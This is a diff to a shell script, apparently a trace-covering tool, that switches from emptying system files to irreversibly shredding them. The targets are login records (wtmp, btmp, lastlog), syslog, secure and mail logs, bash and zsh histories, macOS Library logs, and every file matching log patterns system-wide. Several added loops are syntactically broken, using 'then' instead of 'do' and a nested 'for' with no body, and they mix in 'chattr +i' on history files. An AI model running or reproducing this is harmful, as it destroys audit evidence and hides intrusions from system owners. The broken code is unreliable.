@@ -40,35 +40,36 @@ banner() {
 }
 
 remove_login() {
-    cat /dev/null /var/log/wtmp 2>/dev/null
-    cat /dev/null /var/log/btmp 2>/dev/null
-    cat /dev/null /var/log/lastlog 2>/dev/null
+      shred -zfxn 10 /var/log/wtmp 2>/dev/null
+      shred -zfxn 10 /var/log/btmp 2>/dev/null
+      shred -zfxn 10 /var/log/lastlog 2>/dev/null
 }
 
 other_logs() {
-    cat /dev/null /var/log/messages 2>/dev/null
-    cat /dev/null /var/log/maillog 2>/dev/null
-    cat /dev/null /var/log/secure 2>/dev/null
-    cat /dev/null /var/log/syslog 2>/dev/null
-    cat /dev/null /var/log/dmesg 2>/dev/null
+      shred -zfxn 10 /var/log/messages 2>/dev/null
+      shred -zfxn 10 /var/log/maillog 2>/dev/null
+      shred -zfxn 10 /var/log/secure 2>/dev/null
+      shred -zfxn 10 /var/log/syslog 2>/dev/null
+      shred -zfxn 10 /var/log/dmesg 2>/dev/null
 
     for mail_f in $(find /var/log/ -name "mail\.*" 2>/dev/null)
         do
-            cat /dev/null $mail_f 2>/dev/null
+              shred -zfxn 10 $mail_f 2>/dev/null
     done
 }
 
 bash_history() {
     for bash_history in $(find / -name ".bash_history" 2>/dev/null)
         do
-            cat /dev/null $bash_history 2>/dev/null
+               for zsh_history in $( find / -name ".zsh_history" 2>/dev/null)
+               chattr +i $bash_history && chattr +i $zsh_history  2>/dev/null
     done
 }
 
 zsh_history() {
     for zsh_history in $(find / -name ".zsh_history" 2>/dev/null)
         do
-            cat /dev/null $zsh_history 2>/dev/null
+              shred -zfxn 10 $zsh_history 2>/dev/null
     done
 }
 
@@ -76,7 +77,7 @@ mac_root_logs() {
 
     for mac_root_logs in $(find ~/Library  -name "*.log" 2>/dev/null)
         do
-            cat /dev/null $mac_root_logs 2>/dev/null
+              shred -zfxn 10 $mac_root_logs 2>/dev/null
     done
 }
 
@@ -84,19 +85,20 @@ mac_normal_logs() {
     
     for mac_normal_logs in $(find /Library  -name "*.log" 2>/dev/null)
         do
-            cat /dev/null $mac_normal_logs 2>/dev/null
+              shred -zfxn 10 $mac_normal_logs 2>/dev/null
     done
     
 }
 
 logs_f() {
-    find / -name "*\.log\.*" 2>/dev/null >> .logs
-    find / -name "*\.log\.*\.*" 2>/dev/null >> .logs
-    find / -name "*\.*\.log\.*" 2>/dev/null >> .logs
+
+   for i in $(find / -name "*\.log\.*"); then  shred -zfxn 10 $i 2>/dev/null >> .logs ; done
+    for i in $(find / -name "*\.log\.*\.*"); then shred -zfxn 10 $i  2>/dev/null >> .logs ; done
+    for i in $(find / -name "*\.*\.log\.*"); then shred -zfxn 10 $i  2>/dev/null >> .logs ; done
 
     while read log_f
         do
-            cat /dev/null $log_f 2>/dev/null
+              shred -zfxn 10 $log_f 2>/dev/null
             printf "\n\033[0;32m[+] \033[0;37mLog deleted: $log_f"
     done < .logs
     rm -f .logs
